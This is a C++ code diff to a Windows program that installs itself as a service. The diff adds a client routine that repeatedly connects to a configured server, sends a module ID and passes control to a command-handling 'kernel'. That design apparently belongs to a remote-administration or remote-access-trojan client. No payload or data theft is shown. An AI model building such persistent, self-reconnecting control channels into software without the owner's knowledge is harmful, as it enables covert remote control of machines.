@@ -5,6 +5,7 @@
 
 DWORD                 CApp::ServerPort          = 10086;
 char                  CApp::ServerAddress[0x20] = "127.0.0.1";
+
 SERVICE_STATUS        CApp::ServiceStatus;
 SERVICE_STATUS_HANDLE CApp::hStatus;
 
@@ -27,6 +28,7 @@ BOOL CApp::InstallService()
 	TCHAR     FilePath[MAX_PATH];
 
 	hServiceMgr = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+
 	if (hServiceMgr == NULL)
 	{
 		return FALSE;
@@ -185,16 +187,65 @@ void CApp::RunAsService()
 
 DWORD WINAPI CApp::StartKernel(LPVOID Param)
 {
-	/*CIOCPClient::SocketInit();
-	CIOCPClient client(
-			ServerAddress, 
-			ServerPort,
-			TRUE,
-			INFINITE);
+	WSADATA   wsadata;
+	CIOCP *   iocp = NULL;
+	HANDLE    hEvent = CreateEvent(0, 0, 0, 0);
+	CClient * client = NULL;
+	CKernel * kernel = NULL;
 
-	CKernel  kernel(&client);
-	client.Run();
-	CIOCPClient::SocketTerm();*/
+	if (WSAStartup(MAKEWORD(2, 0), &wsadata))
+	{
+		dbg_log("WSAStartup failed with error : %d", WSAGetLastError());
+		exit(1);
+	}
+
+	//COM initialize 
+	HRESULT hr = CoInitializeEx(0, COINIT_MULTITHREADED);
+	if (FAILED(hr))
+	{
+		dbg_log("CoInitializeEx failed with error : %d", GetLastError());
+		exit(1);
+	}
+
+
+	//create iocp.
+	iocp = new CIOCP();
+
+	if (!iocp->Create())
+	{
+		dbg_log("iocp->Create() failed");
+		ExitProcess(-1);
+	}
+
+	//create client socket and kernel handler.
+	client = new CClient;
+	kernel = new CKernel(client);
+
+	while (1)
+	{
+		client->Create();
+		client->Bind(0);
+
+		iocp->AssociateSock(client);
+
+		client->Connect(ServerAddress, ServerPort, NULL, hEvent);
+		WaitForSingleObject(hEvent, INFINITE);
+
+		if (client->IsConnected())
+		{
+			UINT32 ID = kernel->GetModuleID();
+			client->Send((BYTE*)&ID, sizeof(ID));
+			kernel->OnOpen();
+
+			client->Run();
+			kernel->Wait();
+
+			dbg_log("connection close");
+		}
+
+		client->Close();
+		Sleep(1000);
+	}
 	return 0;
 }
 
@@ -205,6 +256,10 @@ void CApp::Run()
 	if (StrStrA(szCmdLine, " -AsService"))
 	{
 		RunAsService();
+	}
+	else if (StrStrA(szCmdLine, " -AsClient"))
+	{
+		StartKernel(NULL);
 	}
 	else if (!InstallService())
 	{
